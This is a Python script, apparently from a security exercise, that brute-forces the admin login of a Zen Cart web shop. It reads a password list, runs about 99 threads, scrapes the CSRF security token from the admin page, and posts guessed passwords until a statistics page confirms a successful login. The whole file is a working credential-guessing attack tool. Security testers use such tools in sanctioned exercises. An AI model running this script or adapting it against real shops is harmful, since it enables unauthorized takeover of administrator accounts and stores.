#!/usr/local/bin/python2.7

import requests
import os
from optparse import OptionParser
import threading
import queue


# This version of Python does not have a "true SSLContext" object available. Which we don't need.
# Still, it spews errors all over the place as a consequence. Let's disable these annoying warnings.
requests.packages.urllib3.disable_warnings()


def main():
    parser = OptionParser(usage="usage: %prog [options]",
                          version="%prog 1.0")
    parser.add_option("-s", "--server",
                      action="store",
                      dest="url",
                      help="URL to be checked (required)")
    parser.add_option("-p", "--passfile",
                      action="store",
                      dest="passfile",
                      help="Path to file with passwords")
    parser.add_option("-u", "--user",
                      action="store",
                      dest="user",
                      help="User name to be used with validation")
    parser.add_option("-a", "--admin",
                      action="store",
                      dest="adminurl",
                      help="URL of the Admin page")
    parser.add_option("-r", "--release",
                      action="store",
                      dest="release",
                      help="Release version of ZenCart to be checked")
    (options, args) = parser.parse_args()

    with open(options.passfile) as f:
        content = f.readlines()
    # remove whitespace characters like `\n` at the end of each line
    passwords = [x.strip() for x in content]

    passqueue = queue.Queue()
    for password in passwords:
        passqueue.put(password)

    threads = []
    for i in range(1, 100):  # Number of threads
        worker = WorkerThread(passqueue, i, parser)
        worker.setDaemon(True)
        worker.start()
        threads.append(worker)


    passqueue.join()

    # wait for all threads to exit
    for item in threads:
        item.join()
    fail()


class WorkerThread(threading.Thread):
    def __init__(self, queue, tid, parser):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid
        self.parser = parser

    def run(self):

        (options, args) = self.parser.parse_args()

        while True:
            try:
                password = self.queue.get(timeout=1)
            except queue.Empty:
                return

            print(password)

            s = requests.Session()
            try:
                r = s.get(options.adminurl, verify=False)
            except Exception as e:
                error("Unable to complete the request to the admin page at {0}.".format(options.adminurl), options.url,
                      options.release)

            if r.status_code != 200:
                error(
                    "Unable to complete the request to the admin login page at {0}; server returned status code {1}".format(
                        options.adminurl, r.status_code), options.url, options.release)

            required_text = b"Zen Cart!"
            if not required_text in r.content:
                error("Zen Cart admin login page {0} does not appear to have the proper content.".format(
                    options.adminurl),
                      options.url, options.release)

            required_text = b"name=\"securityToken\" value=\""
            token = r.content.split(required_text)[1].split(b"\">")[0]
            actiontoken = "1"

            currenturl = options.adminurl + "/login.php"
            try:
                r = s.post(currenturl, verify=False,
                           data={'admin_name': options.user,
                                 'admin_pass': password,
                                 'securityToken': token,
                                 'submit': 'Login',
                                 'action': actiontoken}
                           )

            except Exception as e:
                print(e)
                error("Unable to complete the request to {0}.".format(currenturl), options.url, options.release)

            if r.status_code != 200:
                error(
                    "Unable to complete the request to {0}; server returned status code {1}".format(currenturl,
                                                                                                    r.status_code),
                    options.url, options.release)

            # Wrong Password
            logincontent = b"wrong"
            if logincontent in r.content:
                continue

            # If you get sent back to the login page again, well, you didn't login, did you?
            logincontent = b"Admin Login"
            if logincontent in r.content:
                continue

            # Successful login shows stats page
            logincontent = b"Statistics"
            if logincontent in r.content:
                # print("Correct Password %s" % password)
                success(password, options.url)


def success(password, url):
    host = url.split("/")[2]
    print("Successful Login on host {0} with password {1}".format(host, password))
    os._exit(0)


def error(reason, url, release):
    host = url.split("/")[2]
    print(
        "Exercise Control Zen Cart Check FAIL on {0} Checked URL:{1}. Zen Cart Version:{3}. {2}".format(host, url,
                                                                                                        reason,release))


def fail():
    print("Failed to brute force password")
    os._exit(0)


if __name__ == "__main__":
    main()
